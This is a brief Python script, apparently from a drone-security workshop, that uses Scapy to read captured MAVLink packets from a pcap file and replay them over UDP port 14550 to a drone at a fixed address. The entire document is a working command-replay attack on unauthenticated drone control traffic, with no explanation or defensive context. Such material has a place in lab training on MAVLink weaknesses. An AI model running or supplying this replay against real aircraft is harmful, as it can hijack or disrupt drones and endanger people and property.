from scapy.all import *
import time

# Load the captured packet
pkts = rdpcap('~/workshop/captures/mavlink-replay.pcap')

# Find MAVLink COMMAND_LONG packets (you may need to adjust the filter)
mavlink_pkts = [p for p in pkts if UDP in p and p[UDP].dport == 14550]

# Replay each packet
print(f"Replaying {len(mavlink_pkts)} MAVLink packets...")
for pkt in mavlink_pkts:
    # Reconstruct and send to drone
    send(IP(dst="10.1.1.10")/UDP(dport=14550)/pkt[UDP].payload,
         verbose=False)
    time.sleep(0.1)

print("Replay complete.")